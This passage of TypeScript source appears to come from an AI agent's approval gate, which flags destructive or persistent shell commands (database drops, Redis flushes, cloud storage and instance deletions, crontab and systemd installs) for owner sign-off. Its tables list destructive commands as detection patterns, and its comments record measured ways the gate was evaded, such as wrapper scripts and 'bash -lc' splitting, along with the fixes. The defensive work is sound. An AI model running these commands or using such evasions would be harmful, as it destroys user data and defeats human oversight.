    // host and ssh's own options come off the way `sudo`'s do - and judge THAT: `ssh host ls` and
    // `ssh -V` still raise nothing (the remote command is a read, or is absent), while a publish
    // carried to the other end is seen. Read past the host by grammar rather than by walking on,
    // because a bare hostname like `host` is itself a name this file places (the DNS tool).
    if (name === 'ssh') {
      // ssh joins its remote arguments with spaces and hands the far end one string, so
      // `['host', 'npm publish']` and `['host', 'npm', 'publish']` run the same command there. The
      // joined spelling arrived here as one token that no operation table could match.
      const remote = sshRemoteCommand(rest)
        .flatMap((token) => unquoted(token).split(/\s+/))
        .filter(Boolean);
      return remote.length ? publishingOperation(remote) : null;
    }
    // `docker run img npm publish` publishes from inside the container. The image and `run`'s options
    // are not names this file places, so the walk resumes past them and stops at the first placeable
    // word - which keeps `docker run img npm test` and `docker build` null. `docker exec` is judged
    // separately, against another box's filesystem; only `run` carries a command this walk is about.
    // `docker container run` is the long form of which `docker run` is the shortcut, and it carries
    // the same command.
    if (name === 'docker' || name === 'podman') {
      const words = rest
        .slice(0, 2)
        .map((token) => (unquoted(token).split('/').pop() ?? '').toLowerCase());
      if (words[0] === 'run' || (words[0] === 'container' && words[1] === 'run')) continue;
    }
    /*
     * An interpreter placed after the image - `docker run img sh -c "npm publish"` - is a name
     * this file places, so the walk used to stop at it and the script in its `-c` was never read.
     * A top-level interpreter is read by `scriptCommands` before this walk ever sees it; one
     * reached mid-walk is read here the same way, and judged by what its script runs.
     */
    if (commandInterpreters.has(name)) {
      const inner = nestedScript(rest);
      if (!inner.length) return null;
      for (const command of scriptCommands(inner.join(' '))) {
        const carried = publishingOperation(command);
        if (carried) return carried;
      }
      return null;
    }
    if (placeableExecutable(name)) return null;
  }
  return null;
};

/**
 * The command an `ssh` invocation runs on the far end, with ssh's own options and the host removed.
 *
 * The option surface is ssh's value-taking flags; everything up to and including the first token
 * that is not one of those, and not itself a flag, is ssh and its host, and what follows runs on
 * the other computer. `ssh -V` and `ssh host` (no command) return nothing.
 */
const SSH_VALUE_OPTIONS = new Set([
  '-b',
  '-c',
  '-D',
  '-E',
  '-e',
  '-F',
  '-I',
  '-i',
  '-J',
  '-L',
  '-l',
  '-m',
  '-O',
  '-o',
  '-p',
  '-Q',
  '-R',
  '-S',
  '-W',
  '-w'
]);
const sshRemoteCommand = (rest: readonly string[]): string[] => {
  let index = 0;
  let hostSeen = false;
  for (; index < rest.length; index += 1) {
    const token = rest[index] ?? '';
    if (hostSeen) return [...rest.slice(index)];
    if (token === '--') {
      hostSeen = true;
      continue;
    }
    if (SSH_VALUE_OPTIONS.has(token)) {
      index += 1;
      continue;
    }
    if (token.startsWith('-')) continue;
    hostSeen = true;
  }
  return [];
};

/* -------------------------------------------------------------- what a rewind does not put back */

/**
 * WHAT THE UNDO POINT COVERS, which is the fact this whole section is keyed on.
 *
 * `CHECKPOINT_CONTENT` (services/workspace-runner/src/checkpoints.ts) is `['workspace',
 * '.athanor/artifacts']`. That is the whole of what a rewind restores, and it decides which of the
 * commands below are worth a card and which are friction. `rm -rf node_modules` lands inside it and
 * cards anyway, from a rule older than the checkpoint; `dropdb production`, `redis-cli flushall`,
 * `docker volume rm pgdata` and `aws s3 rm --recursive` all land outside it and raised NOTHING in
 * balanced or autonomous, while the always-resident contract told the owner that destroying data
 * always stops. Measured through the shipped `approvalRequirement` at 89185c6, over eighty commands
 * in all three modes: sixty-four were free in autonomous, and every database, cache, bucket,
 * container volume and scheduling command among them was one of the sixty-four.
 *
 * THE OPERATION AND NOT THE EXECUTABLE, which is the rule the package-registry work already
 * established here and the reason this is a table rather than a set of names. `psql` is not
 * `psql -c 'DROP DATABASE'`: the owner's own scenario runs `psql tracker -f migrations/001_init.sql`
 * and `psql tracker -c "select count(*) from tenancies"` twice each, so a card keyed on `psql`
 * charges the owner for their own migration and their own row count. Same for `docker`, whose
 * ordinary day is `build`, `run` and `ps`, and `systemctl`, whose ordinary day is `status` and
 * `restart`.
 *
 * AND THE SAME RULE DECIDES WHAT IS ABSENT. A package-manager cache clear - `npm cache clean
 * --force`, `pnpm store prune`, `go clean -modcache`, `brew cleanup` - destroys nothing that cannot
 * be fetched again from the place it came from, so what it costs is minutes rather than data and it
 * raises no card here. `cargo clean` deletes `target/`, which is inside `CHECKPOINT_CONTENT` and is
 * put back by a rewind. `git branch -D`, `git reflog expire` and `git gc --prune=now` are the same
 * answer one level down: they rewrite `.git`, and the repository the agent works in lives under
 * `workspace/`, so the undo point already holds what they threw away. The one git act that leaves
 * the checkpoint's reach is the one that reaches another computer, and it already cards - see
 * `forcedGitPush`. All of this is written down in docs/design/itself/DESTRUCTION.md rather than
 * left to be rediscovered as a hole.
 */
/**
 * `carried` is the third because the sentence a card prints is different, not because the rule is.
 * A destruction inside a container or a pod is outside the checkpoint for a reason the other two
 * previews do not state - the boundary, rather than the kind of store - and the store preview's
 * "a database, a cache, a bucket or a container volume" is the wrong list to read over
 * `docker exec pg rm -rf /var/lib/postgresql`.
 */
export type DestructionKind = 'store' | 'persistence' | 'carried';

/** What this command destroys or leaves running, and which of the two it is. */
export interface DestructionOperation {
  readonly kind: DestructionKind;
  readonly operation: string;
}

/**
 * The two clients whose whole invocation is the act.
 *
 * `dropdb x` and `dropuser x` have no other mode: there is no read verb, no subcommand, and the
 * only options that do not drop something are the ones that print the manual. So these are named
 * rather than operation-matched, and they are the only two names in this section that are.
 */
const DESTROYING_EXECUTABLES = new Set(['dropdb', 'dropuser']);

/**
 * The clients that take a statement on the command line, and are therefore readable.
 *
 * A statement is evidence; a file is not. `psql -f migrations/001_init.sql` is the shape the
 * owner's own build uses and its contents are on the far side of a path this function cannot open,
 * so it raises nothing and is recorded as the gap it is. What arrives as text - `-c`, `-e`,
 * `--command=`, `sqlite3 app.db 'DROP TABLE users'` - is read, and read per argument rather than
 * over the joined line, because the clause that decides an unqualified `DELETE FROM` is the ABSENCE
 * of anything after the table name and joining the arguments would put the next one there.
 */
const SQL_CLIENTS = new Set([
  'clickhouse-client',
  'cockroach',
  // Cassandra's client, whose `-e` is the same evidence every other name here gives. It brings one
  // word with it: a keyspace is Cassandra's database and `DROP KEYSPACE` is `DROP DATABASE` spelled
  // its way, so the word is in `SQL_DROP` rather than in a second pattern.
  'cqlsh',
  'duckdb',
  'mariadb',
  'mysql',
  'psql',
  'sqlite',
  'sqlite3',
  'usql'
]);

/**
 * The tools whose SUBCOMMAND is the act, rather than a statement it is handed.
 *
 * `mysqladmin drop app` was the first, and DESTRUCTION.md filed the rest of this shape under "the
 * operation is in a recipe", which was the wrong reason and is why they went unclosed: `make
 * db-reset` really is a recipe and nothing in the command names the act, but `rails db:drop`,
 * `prisma migrate reset` and `typeorm schema:drop` name it exactly, in the tool's own vocabulary.
 * Measured through the shipped `approvalRequirement` at 59d3e67: all four FREE in balanced and
 * autonomous.
 *
 * Each row drops a whole database or schema and each lands outside `CHECKPOINT_CONTENT` - the
 * server's own data directory, or a hosted one - so a rewind of the turn puts none of it back.
 * `rails db:migrate`, `prisma migrate dev`, `prisma migrate deploy` and `prisma db push` are
 * pointedly absent: those apply a migration, which is the owner's own build step, and this section
 * has already measured once what keying on the tool instead of the operation costs.
 *
 * `make`, `npm run`, `just` and `task` remain open and are written down as open. The act is behind a
 * target name the author chose, `npm run db:reset` and `npm run build` are one word apart in the
 * only place a classifier can look, and nothing here can open the Makefile.
 */
const ADMIN_STORE_OPERATIONS: Record<string, readonly (readonly string[])[]> = {
  heroku: [['pg:reset']],
  mysqladmin: [['drop']],
  prisma: [['migrate', 'reset']],
  rails: [['db:drop'], ['db:reset']],
  typeorm: [['schema:drop']]
};

/**
 * A statement that removes a table, a schema, a database or every row of one.
 *
 * `DELETE FROM t WHERE …` is deliberately not here and the difference is the whole care in this
 * pattern: a qualified delete is what an application does to its own rows all day, and an
 * unqualified one is a truncate wearing different words. The clause is "nothing follows the table
 * name", which is what separates them, rather than a list of the shapes a `WHERE` can take.
 *
 * `DROP INDEX` and `DROP VIEW` are here because both throw away something only a migration can
 * rebuild, and neither is reachable by accident. `DROP FUNCTION`, `DROP TRIGGER` and the rest of
 * the schema vocabulary are not: the same argument would admit every DDL verb there is, and the
 * card would then be in front of the migration itself.
 *
 * THE END OF THE STATEMENT, NOT THE END OF THE LINE, which is the clause the delete pattern turns
 * on and the one it got wrong. It carried the `m` flag, so `$` meant end of LINE, and a qualified
 * delete written the way anybody writes a long one -
 *
 *     DELETE FROM tenancies
 *     WHERE ended_at < now()
 *
 * - matched at the end of its first line and carded as "DELETE FROM with no WHERE". The heredoc
 * form did it too, and `FREE_STORE_WORK` held a counterweight row for exactly this written on one
 * line, which is the single spelling that passed. A statement ends at a `;` or at the end of the
 * text, so those are what it is anchored to now; `\s` crosses newlines with the flag gone, so a
 * multi-statement body still reaches every one of its statements through the `;`.
 */
const SQL_DROP =
  /\bdrop\s+(database|keyspace|schema|table|tablespace|role|user|index|sequence|materialized\s+view|view)\b/i;
const SQL_TRUNCATE = /\btruncate\s+\S/i;
const SQL_UNQUALIFIED_DELETE = /\bdelete\s+from\s+[^\s;'"]+\s*(?:;|['"]?\s*$)/i;

/**
 * The act a statement performs, named the way a card can print it, or null.
 *
 * The name and not the statement, because the card's headline is the name: quoting the whole of
 * `DROP SCHEMA public CASCADE; DROP DATABASE production` into an action line gives the owner a dump
 * to read rather than a question to answer, which is the shape `approvalToolPhrases` exists to
 * stop. The statement itself is in the preview, where the whole command already is.
 */
export const destructiveSqlOperation = (statement: string): string | null => {
  const dropped = SQL_DROP.exec(statement);
  if (dropped) return `DROP ${(dropped[1] ?? '').toUpperCase().replace(/\s+/g, ' ')}`;
  if (SQL_TRUNCATE.test(statement)) return 'TRUNCATE';
  return SQL_UNQUALIFIED_DELETE.test(statement) ? 'DELETE FROM with no WHERE' : null;
};

/**
 * The key-value clients, and the two commands that empty a store rather than a key.
 *
 * `del` and `unlink` name what they remove and are not here; `flushall` and `flushdb` name nothing,
 * which is the point of them. Redis persistence lives in the server's own data directory, so
 * neither is inside `CHECKPOINT_CONTENT` and neither is undone by a rewind.
 */
const KEY_VALUE_CLIENTS = new Set(['keydb-cli', 'redis-cli', 'valkey-cli']);
const KEY_VALUE_DESTRUCTION = new Set(['flushall', 'flushdb']);

/**
 * The same two commands one layer in, inside the Lua the client hands the server.
 *
 * DESTRUCTION.md recorded `redis-cli eval "return redis.call('flushall')" 0` as open and called
 * reading it "a Lua reader". It is not: this is the shape `DESTRUCTIVE_DOCUMENT_CALL` already has
 * for mongosh, where a destructive verb arrives as a line of JavaScript and is matched on the CALL
 * rather than by evaluating the language. `redis.call` and `redis.pcall` are the only two ways a
 * script reaches a command, and the command is a quoted literal beside them. Measured at 59d3e67:
 * free in balanced and autonomous, while the bare `redis-cli flushall` beside it carded in all
 * three.
 *
 * What it does NOT read is a script built at runtime - `redis.call(cmd)` where `cmd` came from an
 * argument - and `--eval script.lua`, whose body is on the far side of a path this function cannot
 * open. That is the same bound `psql -f` has and it is recorded as open in the same place.
 */
const KEY_VALUE_SCRIPT_DESTRUCTION = /\bredis\.p?call\s*\(\s*['"]?(flushall|flushdb)\b/i;

/**
 * The document clients, whose destructive verbs arrive as a line of JavaScript.
 *
 * Matched on the method rather than on the receiver, for the reason `DESTRUCTIVE_RUNTIME_CALL`
 * gives about `require('fs')`: `db.dropDatabase()`, `db.getSiblingDB('x').dropDatabase()` and
 * `db.users.drop()` are one act under three receivers. `deleteMany` and `remove` are matched only
 * with an EMPTY filter, which is the same clause the unqualified `DELETE FROM` above turns on.
 */
const DOCUMENT_CLIENTS = new Set(['mongo', 'mongosh']);
const DESTRUCTIVE_DOCUMENT_CALL =
  /\.drop(?:database|indexes)?\s*\(|\b(?:deletemany|remove)\s*\(\s*(?:\{\s*\}\s*)?\)/i;

/**
 * A word-run that destroys a store this computer does not hold, keyed per executable.
 *
 * Every read and every write verb these tools spell - `ls`, `cp`, `sync`, `mb`, `cat`, `head`,
 * `stat`, `presign`, `ps`, `build`, `run`, `images`, `logs` - is absent by construction, because
 * this table names what removes rather than what is safe. `aws s3 cp` and `aws s3 sync` upload and
 * are somebody else's rule; `aws s3 rm` and `aws s3 rb` take the far copy away, and the far copy is
 * the only copy once the local one is gone.
 *
 * The container rows are here because a volume is where a container's database lives. `docker rmi`
 * is absent - an image is re-pullable and re-buildable - and so is `docker rm`, whose writable
 * layer is scratch by design. `docker volume rm` and `docker volume prune` always take a volume
 * with them, and neither is inside `CHECKPOINT_CONTENT`.
 *
 * `docker system prune` is NOT here, and it was: without `--volumes` it removes stopped containers,
 * unused networks, dangling images and the build cache, every one of which is re-pullable or
 * re-buildable - which is the same answer this section already gives `docker rmi`, `npm cache
 * clean` and `brew cleanup`, and it costs minutes rather than data. Carding it while `docker rmi`
 * beside it was free was this section disagreeing with itself about one act. With `--volumes` it is
 * the whole of `docker volume prune` and more, so it is in `STORE_DESTRUCTION_PAIRS` below, which
 * is the table that exists for exactly this distinction.
 */
/*
 * THE NEXT RING OUT, which the last wave named and did not close. `aws dynamodb delete-table` was a
 * row and `aws rds delete-db-instance` was not, because the tables were written from the object
 * stores outward and stopped there - so DESTRUCTION.md recorded the managed-database control planes
 * as open, and measured through the shipped `approvalRequirement` at 59d3e67 they were: `aws rds
 * delete-db-instance --skip-final-snapshot`, `aws elasticache delete-cache-cluster`, `gcloud sql
 * instances delete` and `az postgres server delete` were all FREE in balanced and autonomous.
 *
 * These are the furthest thing from the checkpoint's reach in this whole file: the data is on
 * somebody else's machine, `--skip-final-snapshot` is a spelling the model can simply write, and
 * nothing on this computer can put any of it back. The rows below are the managed relational, cache
 * and warehouse planes of the three vendors this file already knows, listed by the delete verbs
 * those vendors actually spell. It is a ring and not a closure: a vendor absent from this file
 * (DigitalOcean, Linode, Supabase, PlanetScale) is absent from it here too, and every read, list,
 * describe and create verb is absent by construction, as everywhere else in this table.
 */
const STORE_DESTRUCTION_OPERATIONS: Record<string, readonly (readonly string[])[]> = {
  aws: [
    ['s3', 'rm'],
    ['s3', 'rb'],
    ['s3api', 'delete-object'],
    ['s3api', 'delete-objects'],
    ['s3api', 'delete-bucket'],
    ['dynamodb', 'delete-table'],
    ['rds', 'delete-db-instance'],
    ['rds', 'delete-db-cluster'],
    ['rds', 'delete-db-snapshot'],
    ['rds', 'delete-db-cluster-snapshot'],
    ['elasticache', 'delete-cache-cluster'],
    ['elasticache', 'delete-replication-group'],
    ['redshift', 'delete-cluster']
  ],
  az: [
    ['storage', 'blob', 'delete'],
    ['storage', 'blob', 'delete-batch'],
    ['storage', 'container', 'delete'],
    ['storage', 'fs', 'delete'],
    ['postgres', 'server', 'delete'],
    ['postgres', 'flexible-server', 'delete'],
    ['mysql', 'server', 'delete'],
    ['mysql', 'flexible-server', 'delete'],
    ['sql', 'server', 'delete'],
    ['sql', 'db', 'delete'],
    ['redis', 'delete'],
    ['cosmosdb', 'delete']
  ],
  docker: [
    ['volume', 'rm'],
    ['volume', 'prune']
  ],
  gcloud: [
    ['storage', 'rm'],
    ['storage', 'buckets', 'delete'],
    ['sql', 'instances', 'delete'],
    ['sql', 'databases', 'delete'],
    ['redis', 'instances', 'delete'],
    ['spanner', 'instances', 'delete'],
    ['spanner', 'databases', 'delete'],
    ['bigtable', 'instances', 'delete']
  ],
  gsutil: [['rm'], ['rb']],
  mc: [['rm'], ['rb']],
  podman: [
    ['volume', 'rm'],
    ['volume', 'prune']
  ],
  rclone: [['delete'], ['deletefile'], ['purge'], ['rmdir'], ['rmdirs']],
  s3cmd: [['del'], ['rm'], ['rb']]
};

/**
 * The acts in this section that need a word AND a flag to be themselves.
 *
 * `docker compose down` stops what it started and leaves the volumes where they are; `docker
 * compose down -v` is how a developer's database disappears. Rows here rather than a widening of
 * the table above, because carding the bare `down` would put a card in front of stopping a dev
 * stack - which is ordinary work, several times an hour.
 *
 * `docker system prune` is the same shape and was on the wrong side of it. Bare, and with `-a`, it
 * throws away stopped containers, unused networks, dangling images and the build cache: minutes of
 * re-pulling and re-building, and nothing a rewind is needed for - which is the answer this file
 * already gives `docker rmi` and every package-manager cache clear. `--volumes` is the word that
 * makes it take the database with it, and it is the only spelling here that does. `-v` is
 * deliberately NOT accepted on this row: `docker system prune` has no short form for it, and `-v`
 * on that command is the version flag.
 */
const STORE_DESTRUCTION_PAIRS: Record<
  string,
  readonly { readonly operation: readonly string[]; readonly options: ReadonlySet<string> }[]
> = {
  docker: [
    { operation: ['compose', 'down'], options: new Set(['-v', '--volumes']) },
    { operation: ['system', 'prune'], options: new Set(['--volumes']) }
  ],
  'docker-compose': [{ operation: ['down'], options: new Set(['-v', '--volumes']) }],
  /*
   * A delete carried by an upload verb, which DESTRUCTION.md recorded as open. `mc mirror` copies
   * and removes nothing; `mc mirror --remove` deletes everything in the destination that is not in
   * the source, which is how a bucket empties itself by being synced from the wrong place. The
   * bare verb stays free for the same reason `docker compose down` does - it is ordinary work.
   *
   * `aws s3 sync --delete` is the same act and is deliberately NOT here: it already stops in every
   * mode through the egress arm, because `s3://…` parses as an address, and a second card on a
   * command that already cards is a change with no effect and a new way to be wrong.
   */
  mc: [{ operation: ['mirror'], options: new Set(['--remove']) }],
  podman: [
    { operation: ['compose', 'down'], options: new Set(['-v', '--volumes']) },
    { operation: ['system', 'prune'], options: new Set(['--volumes']) }
  ]
};

/**
 * The dry runs these tools spell, honoured for the reason `DRY_RUN_OPTIONS` gives above: the tool
 * itself enforces the mode before anything leaves, and this table is the only reader of the flag.
 * `aws s3 rm --dryrun` prints what it would delete and deletes nothing, and it is what anybody
 * sensible types first.
 */
const STORE_DRY_RUN_OPTIONS = new Map<string, RegExp>([
  ['aws', /^--dryrun$/],
  ['gsutil', /^-n$/],
  ['mc', /^--dry-run$/],
  ['rclone', /^--dry-run$/],
  ['s3cmd', /^--dry-run$/]
]);

/**
 * Work that outlives the turn, and the reads of the same tools that must not card.
 *
 * The contract's autonomous sentence used to name only files - "a startup file, hook or tool
 * configuration it would run on its own afterwards" - and `deferredExecutionPaths` keeps that half.
 * What no path rule can see is the half that never names a file: `crontab -`, `at now + 1 minute`, `systemctl --user enable` and
 * `launchctl load` all install something that runs after this task and every card in it is over,
 * and all four were free in balanced and autonomous. None of them is inside `CHECKPOINT_CONTENT`
 * either, so a rewind of the turn leaves the schedule running.
 *
 * `systemctl start`, `stop`, `restart` and `daemon-reload` are absent: they change what is running
 * now and nothing about what runs after a reboot, and the owner's own deploy scenario restarts a
 * service. `enable`, `disable`, `mask` and `link` are the ones that write a link into the unit tree.
 */
const PERSISTENCE_OPERATIONS: Record<string, readonly (readonly string[])[]> = {
  // `remove` was the third spelling of `unload` and it was the one missing: DESTRUCTION.md recorded
  // it as open and it measured FREE in balanced and autonomous at 59d3e67. It unloads a job and
  // takes the label out of the manager, which is a change to what runs after this turn either way.
  launchctl: [
    ['load'],
    ['unload'],
    ['remove'],
    ['bootstrap'],
    ['bootout'],
    ['enable'],
    ['disable']
  ],
  systemctl: [
    ['enable'],
    ['disable'],
    ['mask'],
    ['unmask'],
    ['link'],
    ['preset'],
    ['set-default'],
    ['edit']
  ]
};

/**
 * A transient unit is not persistence; a transient TIMER is. `systemd-run --on-calendar=daily` puts
 * a schedule in the manager that survives the turn, and a bare `systemd-run` runs a command once
 * and is gone. Prefix-matched before `=`, because every one of these options is written both ways.
 */
const PERSISTENCE_OPTIONS: Record<string, ReadonlySet<string>> = {
  'systemd-run': new Set([
    '--on-active-sec',
    '--on-boot-sec',
    '--on-calendar',
    '--on-startup-sec',
    '--on-unit-active-sec',
    '--timer-property'
  ])
};

/**
 * The two schedulers whose ordinary invocation IS the write, and the options that make one a read.
 *
 * `crontab` with no argument reads a table off stdin and replaces the owner's whole crontab with it;
 * `crontab file` does the same from a path; `crontab -r` throws it away. Only `-l` prints. `at` and
 * `batch` are the same shape with one option more: `-l` lists and `-c` prints a job back. Keyed per
 * executable rather than as one set, because `crontab -c` is not a read and not an option at all,
 * and a shared exemption would have handed it one. So these are stated as "destructive unless read"
 * rather than as an operation table -
 * the inverse of every other entry in this section, and the honest shape for a command whose
 * default is to write.
 *
 * `atq` and `atrm` are separate programs and are deliberately not here. `atq` only lists, and
 * `atrm 3` names the single job it removes, which is a targeted act rather than the whole table.
 */
const SCHEDULE_READ_OPTIONS: Record<string, ReadonlySet<string>> = {
  at: new Set(['-l', '--list', '-c']),
  batch: new Set(['-l', '--list', '-c']),
  crontab: new Set(['-l', '--list'])
};

/**
 * The names this section will accept behind a word it cannot read, and the ones it will not.
 *
 * The walk hands every arm every word of every command, and the arms that fire on a bare name with
 * no operation beside it are the weakest evidence here - the same fact `deploymentOperation`'s
 * `atHead` exists for. But refusing all of them outright is a bypass rather than a precaution:
 * measured, `./scripts/db dropdb production` raised NOTHING while the bare `dropdb production`
 * carded in all three modes, which is the wrapper defeat `publishingOperation` was written to
 * close, reopened one table along.
 *
 * So the line is drawn on the word rather than on the position. `dropdb`, `dropuser` and `crontab`
 * are program names and nothing else - no English sentence contains them - so they are read
 * wherever the walk finds them. `at` and `batch` are ordinary English words, and the walk reaches
 * them only after passing a word this file cannot name, where "look at this" and "run the batch"
 * are as likely as the scheduler; those two are read at the head and nowhere else.
 */
const NAMED_ANYWHERE = new Set(['crontab', 'dropdb', 'dropuser']);

/**
 * The readers whose operand IS a program name, which is the cost the rule above came with.
 *
 * `NAMED_ANYWHERE` reads `crontab` wherever the walk finds it, and that is what closes the wrapper
 * defeat - it is also what put a card in front of reading the manual. Measured: `man crontab`,
 * `info crontab`, `tldr crontab` and `man -k crontab` each raised "Install work that outlives this
 * turn with crontab" in ALL THREE MODES, so looking up how a scheduler works stopped an autonomous
 * turn, while `grep crontab /etc/passwd` beside them was free only because `grep` happens to sit in
 * an unrelated table and nothing pinned it.
 *
 * Every one of these takes the NAME of a program and prints text about it. None can run the thing
 * it names, so there is no wrapper defeat behind them to protect against: the walk stops here the
 * same way it already stops at `echo` and `git`. `xargs`, `sudo`, `timeout` and `env` are pointedly
 * not here - each of those does run what follows it, and each is a row in `DESTROYS`.
 */
const PROGRAM_NAMING_READERS = new Set([
  'apropos',
  'info',
  'man',
  'tldr',
  'whatis',
  'whereis',
  'which'
]);

/** Whether any option here is one of `names`, matched before a `=` so both spellings count. */
const optionNamed = (options: readonly string[], names: ReadonlySet<string>): boolean =>
  options.some((option) => names.has(option.split('=')[0] ?? option));

/**
 * What this one command destroys or leaves behind, or null - the per-command half of the walk.
 *
 * `atHead` carries the same fact `deploymentOperation` needs it for. The walk below hands this
 * every word of every command so that a wrapper nobody has heard of cannot hide the operation, and
 * the arms that need no operation at all - a bare `dropdb`, a bare `crontab` - would then fire on
 * the word `crontab` inside `grep crontab /etc/passwd`. They are asked only of the head.
 */
const destructionForCommand = (
  executable: string,
  commandArgs: readonly string[],
  atHead: boolean
): DestructionOperation | null => {
  const lowered = commandArgs.map((argument) => unquoted(argument).toLowerCase());
  /*
   * `--help` and `--version` and NOT `-h`, which is the one place this section may not borrow
   * `HELP_OPTIONS` from the deployment table above. `-h` is the HOST option on `psql`, `mysql`,
   * `redis-cli` and `mongosh`, and reading it as help silently exempted every one of them:
   * `redis-cli -h 127.0.0.1 flushall` raised nothing while the bare `redis-cli flushall` beside it
   * carded in all three modes, and `psql -h db.internal -c 'DROP DATABASE x'` would have gone the
   * same way. Losing `-h` costs a card on `docker volume rm -h`, which prints the manual; that is
   * the direction to be wrong in.
   */
  if (lowered.some((argument) => argument === '--help' || argument === '--version')) return null;
  const words = lowered.filter((argument) => !argument.startsWith('-'));
  const options = lowered.filter((argument) => argument.startsWith('-'));
  const store = (operation: string): DestructionOperation => ({ kind: 'store', operation });
  const persistence = (operation: string): DestructionOperation => ({
    kind: 'persistence',
    operation
  });
  const readable = atHead || NAMED_ANYWHERE.has(executable);
  if (readable && DESTROYING_EXECUTABLES.has(executable)) return store(executable);
  if (SQL_CLIENTS.has(executable)) {
    const statement = commandArgs
      .map((argument) => destructiveSqlOperation(unquoted(argument)))
      .find(Boolean);
    if (statement) return store(`${executable} ${statement}`);
  }
  if (KEY_VALUE_CLIENTS.has(executable)) {
    const flush = words.find((word) => KEY_VALUE_DESTRUCTION.has(word));
    if (flush) return store(`${executable} ${flush}`);
    /*
     * The RAW argument, and the quote is optional, because `unquoted` strips every quote in a token
     * and would leave `redis.call(flushall)` behind - a shape a pattern requiring the quote cannot
     * see. Both spellings reach here: the array form keeps its quotes, and a token pulled out of a
     * `bash -lc` script may have lost them.
     */
    const scripted = commandArgs
      .map((argument) => KEY_VALUE_SCRIPT_DESTRUCTION.exec(argument)?.[1])
      .find(Boolean);
    // Lowercased for the same reason the arm above reads `words`: the card names the act, and
    // `FLUSHALL` and `flushall` are one act spelled two ways.
    if (scripted) return store(`${executable} eval calling ${scripted.toLowerCase()}`);
  }
  if (
    DOCUMENT_CLIENTS.has(executable) &&
    commandArgs.some((argument) => DESTRUCTIVE_DOCUMENT_CALL.test(unquoted(argument)))
  )
    return store(`${executable} dropping a database or collection`);
  const dryRun = STORE_DRY_RUN_OPTIONS.get(executable);
  if (!lowered.some((argument) => dryRun?.test(argument))) {
    const matched = operationNamed(
      [
        ...(ownEntry(STORE_DESTRUCTION_OPERATIONS, executable) ?? []),
        ...(ownEntry(ADMIN_STORE_OPERATIONS, executable) ?? [])
      ],
      words
    );
    if (matched) return store(`${executable} ${matched.join(' ')}`);
    for (const pair of ownEntry(STORE_DESTRUCTION_PAIRS, executable) ?? []) {
      // The option AS WRITTEN, not a constant. This printed `--volumes` unconditionally, which was
      // true while every row in this table was a volume flag and became false the moment one was
      // not: `mc mirror --remove` would have carded as "mc mirror --volumes", a card naming a flag
      // the owner did not type on a command that has no such flag.
      const flag = options.find((option) => pair.options.has(option.split('=')[0] ?? option));
      if (flag && operationNamed([pair.operation], words))
        return store(`${executable} ${pair.operation.join(' ')} ${flag}`);
    }
  }
  const persisting = operationNamed(ownEntry(PERSISTENCE_OPERATIONS, executable) ?? [], words);
  if (persisting) return persistence(`${executable} ${persisting.join(' ')}`);
  if (optionNamed(options, ownEntry(PERSISTENCE_OPTIONS, executable) ?? new Set()))
    return persistence(executable);
  const scheduleReads = ownEntry(SCHEDULE_READ_OPTIONS, executable);
  if (readable && scheduleReads && !options.some((option) => scheduleReads.has(option)))
    return persistence(executable);
  return null;
};

/**
 * Every program the section above has an opinion about, for `placeableExecutable`.
 *
 * The walk's stopping condition is "can this file NAME the word", and a name it can act on but
 * cannot recognise is the worst of both: the walk reads past it into its own arguments. Without
 * this, `bash -lc 'psql -c "select * from crontab"'` reached the walk as separate tokens, `psql`
 * was not a name this file knew, and the word `crontab` inside the owner's own query raised
 * "Install work that outlives this turn". Naming them stops the walk where the command
 * really begins.
 */
const namesAStoreOrASchedule = (name: string): boolean =>
  DESTROYING_EXECUTABLES.has(name) ||
  SQL_CLIENTS.has(name) ||
  KEY_VALUE_CLIENTS.has(name) ||
  DOCUMENT_CLIENTS.has(name) ||
  ownEntry(SCHEDULE_READ_OPTIONS, name) !== undefined ||
  ownEntry(ADMIN_STORE_OPERATIONS, name) !== undefined ||
  ownEntry(STORE_DESTRUCTION_OPERATIONS, name) !== undefined ||
  ownEntry(STORE_DESTRUCTION_PAIRS, name) !== undefined ||
  ownEntry(PERSISTENCE_OPERATIONS, name) !== undefined ||
  ownEntry(PERSISTENCE_OPTIONS, name) !== undefined;

/**
 * What this command destroys or leaves running, however many words were put in front of it.
 *
 * The same walk as `publishingOperation`, for the same reason and with the same bound: it does not
 * ask which wrappers exist, because a shell function, an alias and a script on PATH cannot be
 * enumerated. It asks whether this file can NAME the word it is looking at, and keeps reading while
 * the answer is no. `sudo dropdb prod`, `timeout 60 redis-cli flushall` and
 * `deploy-tool docker volume rm pgdata` are all read as themselves; `git commit -m "flushall"`,
 * `echo docker volume rm` and `man crontab` stop at `git`, `echo` and `man`, which this file names.
 */
export const destructionOperation = (tokens: readonly string[]): DestructionOperation | null => {
  for (const [index, token = ''] of tokens.entries()) {
    const name = (unquoted(token).split('/').pop() ?? '').toLowerCase();
    if (!name) continue;
    const found = destructionForCommand(name, tokens.slice(index + 1), index === 0);
    if (found) return found;
    if (PROGRAM_NAMING_READERS.has(name) || placeableExecutable(name)) return null;
  }
  return null;
};

/**
 * A statement the wrapper's quoting took apart, read back off the whole script.
 *
 * `scriptCommands` splits a script on whitespace, so `bash -lc 'psql -c "DROP DATABASE production"'`
 * arrives at the walk as the four tokens `psql`, `-c`, `"DROP` and `DATABASE`, and the statement
 * that decides the card is no longer a statement. Measured: the bare form carded in all three modes
 * and the wrapped form was free in balanced and autonomous - and `shell`'s own description tells the
 * model to reach for `bash -lc` the moment it needs a pipe or a redirect, so the wrapped spelling is
 * the one real work arrives in. Every other gate in this file solved this by reading the script;
 * this one has to read it UNSPLIT, because the evidence spans the split.
 *
 * The pair is required, not either half, and the client half is asked of the HEAD of a command
 * rather than of any word in the script - which is the walk's own stopping condition, kept here
 * because a raw scan of the body does not have it. Measured: a body scan carded
 * `echo "psql -c DROP DATABASE x"`, which is the counterweight row `git commit -m "npm publish"`
 * already holds one table along. `grep -n "DROP TABLE" schema.sql` runs `grep` and raises nothing;
 * `psql -f migrations/001_init.sql` names no statement and raises nothing, which is the shape the
 * owner's own build uses twice.
 *
 * It over-reaches by the width of a script, the same way `scriptCommands` does with a proxy
 * assignment and for the same reason: a client in one line and a drop in another are credited to
 * each other. That costs a card on a script that would not have run the pair, and the alternative
 * is missing every script that does.
 *
 * `consumer` IS THE PROGRAM THE TEXT IS BEING FED TO, and without it this read the body for a
 * client and then refused to look at the one place a client is always named. `shell` takes a
 * `stdin` string - it is in the shipped schema, and `execution.ts` ends the child's stdin with it -
 * so `shell(executable: 'psql', args: ['-d', 'postgres'], stdin: 'DROP DATABASE production;')` is a
